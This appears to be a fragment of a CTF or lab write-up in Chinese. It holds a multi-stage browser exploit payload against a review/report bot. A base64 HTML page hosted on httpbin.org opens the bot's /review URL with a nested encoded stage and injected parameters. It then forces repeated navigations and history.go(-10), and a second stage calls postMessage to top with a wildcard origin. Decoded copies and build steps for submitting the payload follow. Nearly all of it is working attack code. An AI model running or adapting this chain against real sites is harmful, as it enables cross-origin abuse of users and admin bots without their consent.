https://httpbin.org/base64/PCFkb2N0eXBlIGh0bWw+PGJvZHk+UzE8c2NyaXB0Pgp2YXIgcmlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgicmlkIik7CnZhciBub3RlID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgibm90ZSIpOwp3aW5kb3cub3BlbigiaHR0cDovL2xvY2FsaG9zdDozMDAwL3Jldmlldz91PWh0dHBzJTNBJTJGJTJGaHR0cGJpbi5vcmclMkZiYXNlNjQlMkZZV1JrUlhabGJuUk1hWE4wWlc1bGNpZ2ljR0ZuWldocFpHVWlMQ0JtZFc1amRHbHZiaWdwZXlCMGNua2dleUIwYjNBdWNHOXpkRTFsYzNOaFoyVW9lM0E2TVgwc0lDSXFJaWs3SUhSdmNDNXdiM04wVFdWemMyRm5aU2g3Y0RveWZTd2dJaW9pS1RzZ2ZTQmpZWFJqYUNobEtYdDlJSDBwT3clM0QlM0QmcmlkPSIgKyByaWQgKyAiJm5vdGU9IiArIG5vdGUsICJSRVYiKTsKdmFyIHBoID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgicGgiKTsKdmFyIG5uID0gcGFyc2VJbnQobmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgibm4iKXx8IjAiKTsKaWYgKHBoID09PSAiZXZpY3QiKSB7CiAgaWYgKG5uIDwgOCkgeyBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7IGxvY2F0aW9uLmhyZWYgPSBsb2NhdGlvbi5wYXRobmFtZSArICI/cGg9ZXZpY3Qmbm49IiArIChubisxKTsgfSwgMTIwKTsgfQogIGVsc2UgeyBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7IGhpc3RvcnkuZ28oLTEwKTsgfSwgMjAwKTsgfQp9IGVsc2UgeyBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7IGxvY2F0aW9uLmhyZWYgPSBsb2NhdGlvbi5wYXRobmFtZSArICI/cGg9ZXZpY3Qmbm49MSI7IH0sIDM1MDApOyB9Cjwvc2NyaXB0Pg==
```

解码后的原文（与上面两条 base64 一一对应，便于核对）：

```js
addEventListener("pagehide", function(){ try { top.postMessage({p:1}, "*"); top.postMessage({p:2}, "*"); } catch(e){} });
```

```html
<!doctype html><body>S1<script>
var rid = new URLSearchParams(location.search).get("rid");
var note = new URLSearchParams(location.search).get("note");
window.open("http://localhost:3000/review?u=https%3A%2F%2Fhttpbin.org%2Fbase64%2FYWRkRXZlbnRMaXN0ZW5lcigicGFnZWhpZGUiLCBmdW5jdGlvbigpeyB0cnkgeyB0b3AucG9zdE1lc3NhZ2Uoe3A6MX0sICIqIik7IHRvcC5wb3N0TWVzc2FnZSh7cDoyfSwgIioiKTsgfSBjYXRjaChlKXt9IH0pOw%3D%3D&rid=" + rid + "&note=" + note, "REV");
var ph = new URLSearchParams(location.search).get("ph");
var nn = parseInt(new URLSearchParams(location.search).get("nn")||"0");
if (ph === "evict") {
  if (nn < 8) { setTimeout(function(){ location.href = location.pathname + "?ph=evict&nn=" + (nn+1); }, 120); }
  else { setTimeout(function(){ history.go(-10); }, 200); }
} else { setTimeout(function(){ location.href = location.pathname + "?ph=evict&nn=1"; }, 3500); }
</script>
```

构造方式（与 2.5.2 的生成脚本一致）：S2 先做 base64 拼到前缀后面；stage1 的 `u=` 处填 URL 编码后的 S2 链接、整份再做同样的 base64；提交 `/report` 时追加 `?note=<编号>`。

（完）
